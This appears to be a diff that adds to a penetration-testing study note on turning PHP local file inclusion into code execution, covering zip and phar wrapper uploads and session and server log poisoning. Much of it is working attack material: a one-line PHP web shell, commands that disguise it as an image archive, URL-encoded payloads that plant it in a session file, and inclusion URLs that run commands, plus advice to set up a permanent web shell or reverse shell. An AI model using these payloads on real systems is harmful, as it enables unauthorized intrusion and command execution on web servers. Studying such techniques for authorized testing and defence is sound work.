@@ -179,3 +179,102 @@ http://<SERVER_IP>:<PORT>/index.php?language=./profile_images/shell.gif&cmd=id
 
 ## Zip Upload
 
+We can utilize the [zip](https://www.php.net/manual/en/wrappers.compression.php) wrapper to execute PHP code. Important note that this wrapper isn't enabled by default.
+
+We start by creating a web shell script and zipping it into an archive called `shell.jpg`
+
+```sh
+echo '<?php system($_GET["cmd"]); ?>' > shell.php && zip shell.jpg shell.php
+```
+
+```ad-note
+Even though our zip archive is named as a `.jpg`, some upload forms may still detect our file as a zip archive through content-type tests and disallow its upload.
+```
+
+Once we upload the `shell.jpg` archive, we can include it with the `zip` wrapper as (`zip://shell.jpg`) and then refer to any files within it with `#shell.php` (URL Encoded)
+
+```sh
+http://<SERVER_IP>:<PORT>/index.php?language=zip://./profile_images/shell.jpg%23shell.php&cmd=id
+```
+
+## Phar Upload
+
+We can use the `phar://` wrapper to achieve similar results. To do so, we'll first write the following PHP script into a `shell.php` file:
+
+```php
+<?php
+$phar = new Phar('shell.phar');
+$phar->startBuffering();
+$phar->addFromString('shell.txt', '<?php system($_GET["cmd"]); ?>');
+$phar->setStub('<?php __HALT_COMPILER(); ?>');
+
+$phar->stopBuffering();
+```
+
+This script can be compiled into a `phar` file that when called would write a web shell to a `shell.txt` sub-file, which we can interact with.
+
+We can compile it into a `phar` file and rename it to `shell.jpg` as follows:
+
+```php
+php --define phar.readonly=0 shell.php && mv shell.phar shell.jpg
+```
+
+Now, we should have a `phar` file called `shell.jpg`. Once we upload it to the web application, we can simply call it with the `phar://` and provide its URL path, and specify the sub-file with `/shell.txt` (URL Encoded).
+
+```sh
+http://<SERVER_IP>:<PORT>/index.php?language=phar://./profile_images/shell.jpg%2Fshell.txt&cmd=id
+```
+
+```ad-resources
+There is another (obsolete) LFI/uploads attack worth noting, which occurs if file uploads is enabled in the PHP configurations and the `phpinfo()` page is somehow exposed to us. However, this attack is not very common, as it has very specific requirements for it to work (LFI + uploads enabled + old PHP + exposed phpinfo()). If you are interested in knowing more about it, you can refer to [This Link](https://hacktricks.wiki/en/pentesting-web/file-inclusion/lfi2rce-via-phpinfo.html).
+```
+
+# Log Poisoning
+
+In this attack we will write PHP code in a field we control that gets logged into a log file (i.e. `poison`/`contaminate` the log file), and then include that log file to execute the PHP code.
+
+For this attack to work, the PHP web application should have **read privileges** over the logged files.
+## PHP Session Poisoning
+
+Most PHP web applications utilize `PHPSESSID`, which can hold specific user-related data on the back-end, so the web app keeps track of user details through their cookies.
+
+These details are stored in `session` files on the back-end, usually saved in:
+- **Linux:** `/var/lib/php/sessions/`
+- **Windows:** `C:\Windows\Temp\`
+
+After you find your session file (stored in one of the paths above, e.g. `/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd`), poison your session by including  a web shell payload in the controllable parameter, such as:
+
+```sh
+http://<SERVER_IP>:<PORT>/index.php?language=%3C%3Fphp%20system%28%24_GET%5B%22cmd%22%5D%29%3B%3F%3E
+```
+
+When the server processes the request, it saves the PHP code string into your session file, **poisoning** it.
+
+Then we execute the Poisoned File using the LFI vulnerability:
+
+```sh
+http://<SERVER_IP>:<PORT>/index.php?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd&cmd=id
+```
+
+```ad-important
+To execute another command, the session file has to be poisoned with the web shell again, as it gets overwritten after our last inclusion. Ideally, we would use the poisoned web shell to write a permanent web shell to the web directory, or send a reverse shell.
+```
+
+## Server Log Poisoning
+
+Nginx logs are readable by low privileged users by default (e.g. `www-data`), while the Apache logs are only readable by users with high privileges (e.g. `root`/`adm`).
+
+By default, `Apache` logs are located in `/var/log/apache2/` on Linux and in `C:\xampp\apache\logs\` on Windows, while `Nginx` logs are located in `/var/log/nginx/` on Linux and in `C:\nginx\log\` on Windows.
+
+If we tried including the Apache access log, we'll get the following:
+
+![[Apache Access Log Inclusion.png]]
+
+The log contains our `User-Agent` header, we should poison this value.
+
+There are other similar log poisoning techniques that we may utilize on various system logs, depending on which log we have read access over:
+
+- `/var/log/sshd.log`
+- `/var/log/mail`
+- `/var/log/vsftpd.log`
+
